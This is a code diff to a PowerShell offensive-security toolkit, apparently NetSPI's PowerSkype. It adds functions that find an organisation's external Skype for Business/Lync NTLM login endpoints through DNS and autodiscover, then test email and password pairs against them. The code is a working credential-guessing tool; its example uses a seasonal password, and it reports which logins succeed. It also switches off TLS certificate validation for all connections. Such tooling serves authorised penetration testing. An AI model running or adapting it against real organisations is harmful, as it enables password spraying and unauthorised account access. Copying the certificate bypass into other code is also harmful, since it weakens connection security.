@@ -2,6 +2,7 @@
     File: PowerSkype.ps1
     Author: Karl Fosaaen (@kfosaaen), NetSPI - 2016
     Description: PowerShell functions for enumerating and attacking federated Skype for Business instances.
+    Thanks: @nyxgeek for the http-ntlm authentication endpoints
 #>
 
 # To Do:
@@ -157,6 +158,149 @@ Function Get-SkypeStatus{
     return $TempTblUsers
 }
 
+Function Get-SkypeLoginURL{
+<#
+    .SYNOPSIS
+        Attempts to identify Skype HTTP-NTLM login servers from the autodiscover server.
+    .PARAMETER domain
+        The domain name to lookup.   
+    .EXAMPLE
+        PS C:\> Get-SkypeLoginHost -domain example.com
+		
+#>
+
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$true,
+        HelpMessage="The domain name to lookup.")]
+        [string]$domain
+    )
+
+    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+
+    #Do Nyxgeek subdomain checks first
+
+    $discoDomain = 'lyncdiscover.'+$domain
+    $accessDomain = 'access.'+$domain
+    $meetDomain = 'meet.'+$domain
+    $dialinDomain = 'dialin.'+$domain
+
+    try{($disco = Resolve-DnsName $discoDomain -ErrorAction Stop -Verbose:$false | select Name | Select-Object -First 1)|Out-Null}catch{}
+    try{($access = Resolve-DnsName $accessDomain -ErrorAction Stop -Verbose:$false | select Name | Select-Object -First 1)|Out-Null}catch{}
+    try{($meet = Resolve-DnsName $meetDomain -ErrorAction Stop -Verbose:$false | select Name | Select-Object -First 1)|Out-Null}catch{}
+    try{($dialin = (Resolve-DnsName $dialinDomain -ErrorAction Stop -Verbose:$false | select Name | Select-Object -First 1))|Out-Null}catch{}
+
+
+    if($disco.length -eq 0){Write-Verbose -Message "lyncdiscover record not found"}
+    else{
+        $lyncURL = "https://lyncdiscover."+$domain
+        $webclient = new-object System.Net.WebClient
+        try{
+            $webpage = $webclient.DownloadString($lyncURL)
+            $FullLyncServer = "https://"+($webpage.Split('{')[3].Split('"')[3].Split("/")[2])+"/WebTicket/WebTicketService.svc/Auth"
+            Write-Verbose -Message ("Lyncdiscover Authentication Endpoint Identified - "+$FullLyncServer)
+            return $FullLyncServer
+        }
+        catch {Write-Verbose -Message "The AutoDiscover URL doesn't appear to work"}
+    }
+    
+    if($dialin.length -eq 0){Write-Verbose -Message "dialin record not found"}
+    else{Write-Verbose -Message ("Dialin Authentication Endpoint Identified - https://dialin."+$domain+"/abs/"); return "https://dialin."+$domain+"/abs/"}
+    
+
+    #################STILL NEEDS SOME WORK#################
+    if($meet.length -eq 0){Write-Verbose -Message "meet record not found"}
+    # Still Needs an auth endpoint here
+    else{Write-Verbose -Message "Meet Authentication Endpoint Identified"; return "https://meet."+$domain+""}
+
+    if($access.length -eq 0){Write-Verbose -Message "access record not found"}
+    # Still Needs an auth endpoint here
+    else{Write-Verbose -Message "Dialin Authentication Endpoint Identified"; return "https://access."+$domain+""}
+            
+    Write-Host "`nThe domain does not appear to support any external Skype/Lync authentication endpoints" -ForegroundColor Red; break
+
+
+    return $Returnurl
+        
+}
+
+Function Invoke-SkypeLogin{
+<#
+    .SYNOPSIS
+        Attempts a login as a Skype user.
+    .PARAMETER email
+        The email address to login as.   
+	.PARAMETER password
+        The password to use.
+	.PARAMETER url
+        The url to authenticate against.
+    .EXAMPLE
+        PS C:\> Invoke-SkypeLogin -email test@example.com -password Fall2016 
+		
+#>
+
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$true,
+        HelpMessage="Email address to login as.")]
+        [string]$email,
+
+        [Parameter(Mandatory=$false,
+        HelpMessage="Username to login as.")]
+        [string]$user,
+
+        [Parameter(Mandatory=$true,
+        HelpMessage="Password to use.")]
+        [string]$password,
+
+        [Parameter(Mandatory=$false,
+        HelpMessage="Domain name to login with.")]
+        [string]$domain,
+
+        [Parameter(Mandatory=$false,
+        HelpMessage="The url to authenticate against.")]
+        [string]$url
+    )
+
+    if ($domain.Length -eq 0){$domain = $email.Split("@")[1]}
+    
+    if($url.Length -eq 0){
+        $emailDomain = $email.Split("@")[1]
+        $url = Get-SkypeLoginURL -domain $emailDomain
+    }
+
+    if($url -like '*lync.com*'){Write-Host 'Microsoft Managed Skype for Business instance - HTTP NTLM Auth currently not supported' -ForegroundColor Red; break}
+
+    if($user.Length -eq 0){$user = $email.Split("@")[0]}
+
+    
+    #Test URL - https://webdirca1.online.lync.com/WebTicket/WebTicketService.svc/Auth
+
+
+    #https://meet.lync.com/TENNANT_NAME/USER/MEETING
+
+
+    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+
+    #Depending on the HTTP code, determine if auth was successful
+    #Useful info on the autodiscover protocol - http://www.lyncexch.co.uk/lyncdiscover-and-auto-discovery-deeper-dive/
+
+    $req = [system.Net.WebRequest]::Create($url)
+    $req.Credentials = new-object System.Net.NetworkCredential($user, $password, $domain)
+    try {
+        $res = $req.GetResponse()
+        } catch [System.Net.WebException] {
+        $res = $_.Exception.Response
+        }
+    if ([int]$res.StatusCode -eq '403'){Write-Host 'Authentication Successful: '$user' - '$password -ForegroundColor Green}
+    else{Write-Host 'Authentication Failure: '$user' - '$password -ForegroundColor Red}
+
+    #$webpage = $webclient.DownloadString($url)
+      
+
+    #Write-Host "Successful Authentication for:"$email" - "$password
+
+}
 
 Function Invoke-SendSkypeMessage{
 <#
@@ -424,4 +568,3 @@ Function Get-SkypeFederation{
     $TempTblDomain.Rows.Add([string]$domain,[string]$ms,[string]$sipTrue,[string]$siptlsTrue,[string]$sipFedTrue) | Out-Null
     return $TempTblDomain   
 }
-
